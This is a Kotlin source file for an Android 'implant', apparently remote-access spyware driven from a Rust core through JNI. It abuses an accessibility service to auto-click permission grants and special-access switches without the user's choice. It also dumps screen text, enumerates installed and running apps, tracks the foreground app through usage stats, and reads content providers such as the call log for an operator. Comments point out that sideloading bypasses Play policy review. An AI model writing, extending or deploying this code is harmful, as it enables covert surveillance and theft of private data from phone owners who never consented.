package com.shadow

import android.content.Context
import android.util.Log
import java.util.UUID

/**
 * Kotlin-side implementation of the primitives the Rust core shells out to.
 * Each function is invoked from Rust via JNI (see core/src/android_bridge.rs).
 * Everything here runs in-process with the implant's own UID — no root, no Shizuku.
 *
 * @JvmStatic is REQUIRED on every function below, not cosmetic: members of an
 * `object` otherwise exist only as instance methods on the singleton, while the
 * Rust side resolves them with CallStaticObjectMethod. Drop the annotation and
 * the method silently disappears from the static lookup, so the call fails with
 * NoSuchMethodError and the operator sees only "Java exception was thrown".
 * The descriptor passed from Rust must also match exactly (proto_for()).
 */
object ShadowBridge {
    private const val TAG = "ShadowBridge"

    /** Read screen as a text tree (a11y). */
    @JvmStatic
    fun dumpScreen(): String =
        com.shadow.a11y.ShadowAccessibilityService.instance?.dumpScreen() ?: "a11y not active"

    /** Click a node by visible text / content description (a11y). */
    @JvmStatic
    fun clickByText(needle: String): Boolean =
        com.shadow.a11y.ShadowAccessibilityService.instance?.clickByText(needle) ?: false

    /** Click a node by resource id (a11y). */
    @JvmStatic
    fun clickNodeById(viewId: String): Boolean =
        com.shadow.a11y.ShadowAccessibilityService.instance?.clickNodeById(viewId) ?: false

    /** Open Settings → app permissions and auto-click Allow for all declared perms. */
    @JvmStatic
    fun startAutoGrant(): String {
        val svc = com.shadow.a11y.ShadowAccessibilityService.instance
            ?: return "a11y not active — cannot auto-grant"
        svc.startAutoGrant()
        return "auto-grant started"
    }

    /** List permissions actually granted to this app (PackageManager, own UID). */
    @JvmStatic
    fun grantedPermissions(): String {
        val ctx = ShadowApp.appContext ?: return "no context"
        return try {
            val pkg = ctx.packageName
            val pm = ctx.packageManager
            val info = pm.getPackageInfo(pkg, android.content.pm.PackageManager.GET_PERMISSIONS)
            val requested = info.requestedPermissions ?: emptyArray()
            val out = StringBuilder()
            for (p in requested) {
                val ok = pm.checkPermission(p, pkg) == android.content.pm.PackageManager.PERMISSION_GRANTED
                out.append(if (ok) "GRANTED " else "DENIED  ").append(p).append('\n')
            }
            out.toString()
        } catch (e: Throwable) {
            "grantedPermissions error: ${e.message}"
        }
    }

    /** Recents dump — "all the rest of the buttons" fodder. */
    @JvmStatic
    fun runningApps(): String {
        val ctx = ShadowApp.appContext ?: return "no context"
        return try {
            val am = ctx.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            val procs = am.runningAppProcesses ?: emptyList()
            procs.joinToString("\n") { "${it.processName} (pid=${it.pid})" }
        } catch (e: Throwable) {
            "runningApps error: ${e.message}"
        }
    }

    /**
     * Every installed package: "pkg\ttype\tlabel".
     *
     * Preferred over runningApps, which Android 8+ restricts to our own process
     * and therefore reports almost nothing. PackageManager needs no runtime
     * grant; QUERY_ALL_PACKAGES (declared, install-time) keeps the list complete
     * on Android 11+ package-visibility filtering. Sideloading means Play's
     * policy review of that permission does not apply.
     */
    @JvmStatic
    fun installedApps(): String {
        val ctx = ShadowApp.appContext ?: return "no context"
        return try {
            val pm = ctx.packageManager
            val apps = pm.getInstalledApplications(0)
            apps.joinToString("\n") { ai ->
                val kind = if ((ai.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0) "sys" else "usr"
                val label = try { pm.getApplicationLabel(ai).toString() } catch (e: Throwable) { "-" }
                "${ai.packageName}\t$kind\t$label"
            }
        } catch (e: Throwable) {
            "installedApps error: ${e.message}"
        }
    }

    /**
     * Last app the user actually looked at, via UsageStatsManager.
     *
     * Requires the "usage access" special permission; the native grant path is
     * grant_screen usage (+ toggle_grant), never appops. Without it this reports
     * the exact remedy instead of an empty result.
     */
    @JvmStatic
    fun foregroundApp(): String {
        val ctx = ShadowApp.appContext ?: return "no context"
        return try {
            val usm = ctx.getSystemService(Context.USAGE_STATS_SERVICE)
                as android.app.usage.UsageStatsManager
            val now = System.currentTimeMillis()
            val events = usm.queryEvents(now - 2 * 60 * 60 * 1000L, now)
            val ev = android.app.usage.UsageEvents.Event()
            var last = ""
            var lastTs = 0L
            while (events.hasNextEvent()) {
                events.getNextEvent(ev)
                if (ev.eventType == android.app.usage.UsageEvents.Event.MOVE_TO_FOREGROUND ||
                    ev.eventType == android.app.usage.UsageEvents.Event.ACTIVITY_RESUMED
                ) {
                    last = ev.packageName ?: last
                    lastTs = ev.timeStamp
                }
            }
            if (last.isEmpty()) "no foreground events (usage access granted but log empty?)"
            else "$last\t$lastTs"
        } catch (e: SecurityException) {
            "usage access not granted — run: grant_screen usage, then toggle_grant"
        } catch (e: Throwable) {
            "foregroundApp error: ${e.message}"
        }
    }

    /**
     * Open a special-access Settings screen. These permissions have NO silent API
     * for a normal app — the platform only lets the user flip them — so the
     * native flow is: open the right screen here, then let the accessibility
     * service click the row/switch (toggle_grant). No Shizuku, no adb.
     */
    @JvmStatic
    fun openGrantScreen(kind: String): String {
        val ctx = ShadowApp.appContext ?: return "no context"
        val pkgUri = android.net.Uri.parse("package:${ctx.packageName}")
        val (action, needsData) = when (kind.lowercase().trim()) {
            "allfiles", "files", "storage" ->
                android.provider.Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION to false
            "usage" -> android.provider.Settings.ACTION_USAGE_ACCESS_SETTINGS to false
            "battery" -> android.provider.Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS to false
            "overlay" -> android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION to true
            "notif", "notification" ->
                android.provider.Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS to false
            "a11y", "accessibility" -> android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS to false
            "app", "details" -> android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS to true
            else -> return "unknown screen '$kind' (use allfiles|usage|battery|overlay|notif|a11y|app)"
        }
        return try {
            val intent = android.content.Intent(action).apply {
                if (needsData) data = pkgUri
                addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            ctx.startActivity(intent)
            "opened $action"
        } catch (e: Throwable) {
            // OEM Settings screens are frequently missing; name the fallback so
            // the operator knows what to tap by hand.
            "could not open $action on this ROM (${e.javaClass.simpleName}): ${
                when (kind.lowercase().trim()) {
                    "allfiles", "files", "storage" -> "Settings > Apps > Special app access > All files access"
                    "usage" -> "Settings > Apps > Special app access > Usage access"
                    "battery" -> "Settings > Battery > App launch / sleep optimisation"
                    else -> "Settings search for '$kind'"
                }
            }"
        }
    }

    /** Click the checkable switch for this app on the currently open screen. */
    @JvmStatic
    fun toggleSelfInSettings(): String {
        val svc = com.shadow.a11y.ShadowAccessibilityService.instance
            ?: return "a11y not active — cannot toggle"
        return svc.clickSelfSwitch()
    }

    /**
     * Read a content:// provider with our OWN UID. No shell, no root.
     * Works once the matching runtime permission is granted (see startAutoGrant).
     */
    @JvmStatic
    fun queryProvider(uri: String, projection: String, limit: Int): String {
        val ctx = ShadowApp.appContext ?: return "no context"
        return try {
            val proj = if (projection.isBlank()) null else projection.split(",").toTypedArray()
            val cursor = ctx.contentResolver.query(
                android.net.Uri.parse(uri), proj, null, null, null
            ) ?: return "provider returned null (uri=$uri)"

            val sb = StringBuilder()
            val cols = cursor.columnNames
            sb.append(cols.joinToString("\t")).append('\n')
            var n = 0
            while (cursor.moveToNext() && n < limit) {
                val row = cols.map { c ->
                    val i = cursor.getColumnIndex(c)
                    if (i < 0) "" else (cursor.getString(i) ?: "")
                }
                sb.append(row.joinToString("\t")).append('\n')
                n++
            }
            cursor.close()
            if (n == 0) "empty: $uri" else "rows=$n\n$sb"
        } catch (e: SecurityException) {
            "permission denied for $uri — run auto-grant first (${e.message})"
        } catch (e: IllegalArgumentException) {
            // OEM providers reject columns AOSP documents (call_log cached_name is
            // rejected on ColorOS). Retry unprojected rather than losing the data.
            queryUnprojected(ctx, uri, limit, e.message ?: "invalid projection")
        } catch (e: Throwable) {
            "queryProvider error: ${e.message}"
        }
    }
}

/**
 * Re-run a provider query asking for no projection (the provider returns all
 * columns), used when a requested column is rejected. The header records the
 * fallback so the operator knows the column set is wider than requested.
 */
private fun queryUnprojected(
    ctx: android.content.Context,
    uri: String,
    limit: Int,
    reason: String,
): String {
    return try {
        val cursor = ctx.contentResolver.query(
            android.net.Uri.parse(uri), null, null, null, null
        ) ?: return "provider returned null (uri=$uri; projection rejected: $reason)"
        val sb = StringBuilder()
        val cols = cursor.columnNames
        sb.append("[projection rejected: $reason — returning all columns]\t")
            .append(cols.joinToString("\t")).append('\n')
        var n = 0
        while (cursor.moveToNext() && n < limit) {
            sb.append(cols.joinToString("\t") { c ->
                val i = cursor.getColumnIndex(c)
                if (i < 0) "" else (cursor.getString(i) ?: "")
            }).append('\n')
            n++
        }
        cursor.close()
        if (n == 0) "empty: $uri" else "rows=$n\n$sb"
    } catch (e: Throwable) {
        "queryProvider error: ${e.message} (after projection fallback)"
    }
}
